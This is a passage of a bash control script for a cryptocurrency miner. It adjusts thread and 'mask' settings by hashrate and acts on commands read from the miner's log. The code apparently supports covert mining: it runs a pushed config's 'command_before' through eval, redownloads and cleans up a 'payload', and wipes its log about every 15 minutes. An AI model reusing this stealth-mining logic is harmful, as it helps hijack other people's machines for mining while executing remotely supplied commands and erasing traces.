                           [ $cMhf -gt 1 ]; then
                        SWITCH_STATE=MASK_TRIAL
                    elif [ $cThr -gt 1 ]; then
                        SWITCH_STATE=B_THREAD_TRIAL
                    elif
                        [ $cMhf -gt 1 ]; then
                        SWITCH_STATE=B_MHF_TRIAL
                    else ## minimum mask threads and mhf
                        start_sleeping
                    fi
                    return 0
                    ;;
                "MASK_DOWN_THEN_SLEEP"|\
                    "MASK_UP_THEN_SLEEP"|\
                    "MHF_DOWN_THEN_SLEEP")
                    start_sleeping
                    ;;
                "SLEEP")
                    if [ $SLEEP_TIMER -ge $wakeup_timeout ]; then
                        start_steering
                    fi
                    ;;
            esac
            ;;
    esac
    pQ=$1
    log "STATE_AFTER: $SWITCH_STATE cMhf: $cMhf cThr: $cThr cMsk: $cMsk"
}

## switch config and state depending on hashrate read from $1
switcher() {
    while [ -n "$lockminer" ]; do fleep 1; done ## wait for miner to be restarted
    ## status updates
    loadmon 2>/dev/null
    sleep_timer
    log "sleep timer is $SLEEP_TIMER"
    log "switch state is $SWITCH_STATE"

    ## skip step if pausd is locked
    if ! lock; then
        ## skip step but continue if due past the lock timeout to prevent stalls
        # [ $SLEEP_TIMER -lt $lto ] && return 0
        return ## time is money
    fi

    ## this goes here because it matters only if not paused
    read_coproc cpumon PROC_USG
    # eval "echo $PROC_USG >&${ping_proc_usg}" ## forward to pinger to adjust rate/shares
    # eval "echo $PROC_USG >&${paus_proc_usg}" ## forward to pauser to adjust rate/shares

    if step switchC $switch_stepping; then ## stepping triggered
        ## updated hash vars and sleep timer
        max_hash
        min_hash
        prev_hash
        $current_hash "$1"
        ## is hashrate healthy or sick
        hash_check $XHs $CHs $PHs \
            && decr hash_health $hash_health_drop \
                || incr hash_health $hash_health_boost
        incr switch_trigger_counter
        if [ $switch_trigger_counter -ge $switch_trigger ]; then
            ## compare sickness ratio and decide what to do
            [ $hash_health -le $hash_health_min ] \
                && where=down \
                    || where=up
            ## do the thing
            change_state $where
            change_load $where &&
                log "doing the thing" &&
                unlock &&
                return 1
        fi
    fi
    ## continue pausing, the pauser process must be running
    ## to clear this echo, otherwise it will null the first check
    unlock
    log "nothing to switch"
    return 0
}

## reads log from the miner for speed lines
speedline(){
    [ "${1/speed}" != "${1}" ]
}

## reads log from miner for config pushes
newcfg() {
    [ "${1/trigger restart}" != "${1}" ]
}

## reads log from miner for config pushes
pblcfg() {
    [ "${1/publish config}" != "${1}" ]
}

readonly act_rgx='(accepted|speed|-> publish config|-> trigger restart|-> restart)'
choose_action() {
    [[ "$1" =~ $act_rgx ]]
    read_action=${BASH_REMATCH[0]}
    log "read line $1"
    log "starting $read_action action"
    case "$read_action" in
        "accepted")
            ## eval because the fd might be recreated
            # eval "echo \"\$l\" >&\${forwarded_lines}" ## this fd is created by pausd
            ## put in background because it might stall and give it a timeout
            log "forwarding with timeout..."
            timeout 5 echo "\"$l\"" ">&${forwarded_lines}" &>/dev/null ## this fd is created by pausd
            ;;
        "speed")
            switcher "$l" || { stop_miner; start_miner; } ## non zero exit code means a switch has happened
            ;;
        "-> trigger restart")
            ## trigger restart comes after a config update
            CONFIG="$(<${OBJ_CFG_MASK})"
            eval "$(get_config command_before)"
            stop_miner
            start_miner
            ;;
        "-> restart") ## a direct restart command is reserved for payload redownload
            scratcher
            ;;
        "-> publish config")
            dump_config
            RMCFG_SCHEDULE=60
            ;;
        *) ## if nothing interesting was printed do some routine work
            [ -n "$RMCFG_SCHEDULE" ] && rmcfg ##  set by start miner
            [ "$((SECONDS%1000))" -gt 900 ] && clear_log ## wipe log every ~15mins
            ;;
    esac
}

## this loop needs to be in a function to get the correct coprocess variable for the file descriptor
# start_switcher() {
#     while eval "read -ru \${${OBJ_MASK}[0]} l"; do
#         if speedline "$l"; then
#             switcher "$l" || start_miner ## non zero exit code means a switch has happened
#         fi
#     done
#     fleep 1
# }

## (pausd)
start_switcher() {
    # rto=${rto:-$((2*print_time+10))} ## read timeout
    [ -z "$wakeup_timeout" ] && wakeup_timeout=6
    rto=${rto:-$((wakeup_timeout/2))} ## read timeout
    lto=${lto:-$((2*wakeup_timeout))} ## lock timeout
    while true; do
        ## timeout after reads but only if a sane amount of time from startup has passed (rto*3)
        log "reading a line"
        ## if exit status is less then 128 it means the fd is closed, so the miner is probably stopped
        read -t $rto -ru ${objectd[0]} l ||
            { [ "$?" -lt 128 -o $SECONDS -gt $((rto*3)) ] &&
                  break; }
        log "choosing an action"
        choose_action "$l"
        log "action ended"
    done
    log "line read timeout!"
    fleep 1
}

## start the switcher
start() {
    init
    cleanup ## after init we shouldn't need the payload anymore
    while true; do
        stop_miner &>/dev/null
        start_miner
        start_switcher
        fleep 5
    done
}

## run it
# init
# start
